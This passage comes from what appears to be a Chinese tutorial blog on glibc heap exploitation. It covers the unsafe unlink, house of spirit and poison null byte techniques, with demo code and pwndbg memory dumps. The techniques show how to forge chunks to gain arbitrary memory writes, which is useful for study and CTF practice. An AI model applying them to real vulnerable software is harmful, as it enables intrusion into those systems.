&lt;stderr@@GLIBC_2.2.5&gt;:0x00007ffff7dd25200x0000000000000000 &lt;-- fake chunk BK</span><br><span class="line">0x602070 &lt;chunk0_ptr&gt;:0x00000000006030100x0000000000000000  &lt;-- fd pointer</span><br><span class="line">0x602080:0x0000000000000000</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure><p>这样就就会变成我 fake chunk 的 FD 块的bk指向 fake chunk， fake chunk 的BK 块 的fd指向fake chunk ，这样就能绕过检查。</p><p>另外利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 <code>prev_size</code> 为 fake chunk 的大小，修改 <code>PREV_INUSE</code> 标志位为 0，将 fake chunk 伪造成一个 free chunk。</p><hr><p>libc 使用 size 域的最低 3 位来 存储一些其它信息。相关的掩码信息定义如下: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>从以上代码定义可以推断, size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap 分配, 如果 此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena </p><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x0000000000602060</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br></pre></td></tr></table></figure><p>这样，我们去free chunk1，这个时候系统会检测到 fake chunk是释放状态，会触发 unlink ，fake chunk会向后合并， chunk0会被吞并。</p><p>unlink 的操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd = &amp;P - 24</span><br><span class="line">BK = P-&gt;bk = &amp;P - 16</span><br><span class="line">FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br><span class="line">BK-&gt;fd = *(&amp;P - 16 + 16) = P</span><br></pre></td></tr></table></figure><p>这样就通过了 unlink 的检查，最终效果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = P = BK = &amp;P - 16</span><br><span class="line">BK-&gt;fd = P = FD = &amp;P - 24</span><br></pre></td></tr></table></figure><p>最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。</p><p>在这个例子中，最后chunk0_ptr 和chunk0_ptr[3] 指向的地方是一样的。相对我们如果对chunk0_ptr[3]修改，也是对chunk0_ptr进行了修改。</p><p>在程序中，程序先对chunk0_ptr[3]进行了修改，让它指向了<code>victim_string</code> 字符串的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">50</span> <span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">► <span class="number">51</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br></pre></td></tr></table></figure><p>（如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x00007fffffffe3d0</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">Pwndbg&gt; p chunk0_ptr</span><br><span class="line"><span class="variable">$8</span> = (uint64_t *) 0x603010</span><br></pre></td></tr></table></figure><p>然后我们对<strong>chunk0_ptr</strong> 进行操作，就能得到一个地址写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x41414141424242420x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x00007fffffffe3d0</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">Pwndbg&gt; x/gx chunk0_ptr</span><br><span class="line">0x603010:0x4141414142424242</span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。</p><h3 id="0x06-house-of-spirit"><a href="#0x06-house-of-spirit" class="headerlink" title="0x06 house_of_spirit"></a>0x06 house_of_spirit</h3><p>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. </p><p>通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。</p><p><strong>house of spirit</strong> 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">       <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>伪造情况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="number">0xc2</span>, <span class="number">0x40</span>, <span class="number">0x7fffffffe3ae</span>, <span class="number">0x7ffff7ababe5</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x1234</span>&#125;</span><br><span class="line">Pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> (*)[<span class="number">10</span>]) <span class="number">0x7fffffffe370</span></span><br></pre></td></tr></table></figure><p>其中 0x40 是chunk size，0x1234 是 nextsize。伪造 chunk 时需要绕过一些检查，首先是标志位，<code>PREV_INUSE</code> 位并不影响 free 的过程，但 <code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零。其次，在 64 位系统中 fast chunk 的大小要在 32~128 字节之间。最后，是 next chunk 的大小，必须大于 <code>2*SIZE_SZ</code>（即大于16），小于 <code>av-&gt;system_mem</code>（即小于128kb），才能绕过对 next chunk 大小的检查。</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap 分配, 如果 此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena, 在之后会提到main_arena是主线程用于保存堆状态的结构, 如果此位为 0 则表示此块是在 主线程中分配的  </p><hr><p>然后我们修改指针 a  指向fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">23</span>         <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">  <span class="number">24</span> fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">  <span class="number">27</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">► <span class="number">28</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">29</span></span><br><span class="line">  <span class="number">30</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">31</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">32</span></span><br><span class="line">  <span class="number">33</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>修改后如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p a                                                        </span><br><span class="line"><span class="variable">$11</span> = (unsigned long long *) 0x7fffffffe380--&gt; <span class="variable">$9</span> = (unsigned long long **) 0x7fffffffe368</span><br></pre></td></tr></table></figure><p>成功指向了 fake chunk。当我free a的时候，系统会将 fake chunk 当做一块fastbins 处理，放到fastbins数组里。当我们再malloc的时候。我们就得到一块指向 stack 的 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fffffffe370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/10gx &amp;fake_chunks</span><br><span class="line">0x7fffffffe370:0x00000000000000c20x0000000000000040</span><br><span class="line">0x7fffffffe380:0x00000000000000000x00007ffff7ababe5</span><br><span class="line">0x7fffffffe390:0x00000000000000010x00000000004008ed</span><br><span class="line">0x7fffffffe3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe3b0:0x00000000004008a00x0000000000001234</span><br></pre></td></tr></table></figure><p>所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。</p><p>该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。</p><h3 id="0x07-poison-null-byte"><a href="#0x07-poison-null-byte" class="headerlink" title="0x07 poison_null_byte"></a>0x07 poison_null_byte</h3><p>off-one-by-one 的经典例子，一个0字节溢出。在一个字节溢出中，通常有以下情景：</p><ol><li>扩展块</li><li>收缩块</li></ol><p>首先，我们创建了 a b c barrier 四个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br></pre></td></tr></table></figure><p>值得一提的是， barrier 这个chunk是用来防止 free c 的时候被放入 top-chunk。以及 b c 的 chunk 大小不能为 fastbins chunk size。因为 fastbins chunk 在被释放后不会合并。chunk a的作用是用来制造单字节溢出。</p><p>在进行一字节溢出之前，由于我们通过 chunk a 的单字节溢出修改了 chunk b 的 size ，为了绕过 unlink 的checnk ，我们先伪造一个 c prev_size。 计算方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.prev_size = b_size &amp; 0xff00</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png"></a></p><p>计算结果就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x200 = 0x211 &amp; 0xff00</span><br></pre></td></tr></table></figure><p>正好是 NULL 字节溢出之后的值。紧接着我们 free 掉 chunk b。此时 chunk 布局如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/124gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000111         &lt;-- chunk a</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000211      &lt;--- chunk b [was free]</span><br><span class="line">0x603120:0x00007ffff7dd1b580x00007ffff7dd1b58           fd ,bk</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">0x603140:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000002000x0000000000000000          fake c.prev.size </span><br><span class="line">0x603320:0x00000000000002100x0000000000000110    &lt;--- chunk c</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000000</span><br><span class="line">0x603360:0x00000000000000000x0000000000000000</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line">0x603380:0x00000000000000000x0000000000000000</span><br><span class="line">0x603390:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>Free list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603110 —▸ 0x7ffff7dd1b58 (main_arena+88) ◂— 0x603110</span><br></pre></td></tr></table></figure><p>然后我们利用 一字节溢出 修改 chunk b size。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png"></a></p><p>这个时候我们发现 chunk b 的 size 已经成功被修改，同时我们也 fake 了 个 chunk c。</p><p>*** bypass : chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))** </p><p>紧接着我们 create chunk b1 ，系统会从 free 掉的chunk b 中（已经放入 unsortedbin 取出合适的大小）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p b1</span><br><span class="line"><span class="variable">$25</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br><span class="line">PwnLife&gt; p b</span><br><span class="line"><span class="variable">$26</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png"></a></p><p>我们注意到几个地方：</p><ol><li>chunk b1 的位置就是 chunk b 的位置</li><li>这个时候 b1 和 c 之间有个 chunk b，这个时候 chunk c 的 prev_size 本应该变为 0xf0。但是事实上是</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/30gx 0x603330-0x20</span><br><span class="line">0x603310:0x00000000000000f00x0000000000000000              &lt; --- fake chunk c </span><br><span class="line">0x603320:0x00000000000002100x0000000000000110        &lt; --- chunk c</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000000</span><br><span class="line">0x603360:0x00000000000000000x0000000000000000</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line">0x603380:0x00000000000000000x0000000000000000</span><br><span class="line">0x603390:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033f0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; p c</span><br><span class="line"><span class="variable">$30</span> = (uint8_t *) 0x603330 <span class="string">&quot;&quot;</span>               &lt;--- chunk c ptr</span><br></pre></td></tr></table></figure><p>这是由于我们 fake 了一个 c.prev_size 